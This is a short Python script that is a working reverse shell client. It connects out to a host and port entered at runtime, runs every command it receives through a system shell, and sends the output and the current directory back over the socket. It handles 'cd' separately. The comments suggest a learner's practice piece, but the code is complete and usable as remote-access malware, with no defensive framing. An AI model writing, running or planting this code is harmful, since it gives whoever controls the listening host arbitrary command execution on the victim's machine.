import os
import socket
import subprocess

s = socket.socket()
host = input(("Host: "))
port = int(input("Port: "))
s.connect((host, port))

while True:
	# increase bytes
	data = s.recv(2048)
	# if first 2 characters are cd, change dir to next characters
	# note the :2 is before and the 3: is after
	if data[:2].decode("utf-8") == "cd":
		os.chdir(data[3:].decode("utf-8"))
	if len(data) > 0:
		# process open
		# play around with shell
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes, "utf-8")
		s.send(str.encode(output_str + str(os.getcwd()) + ' $ '))
		#print(output_str)

# Close the connection

s.close()
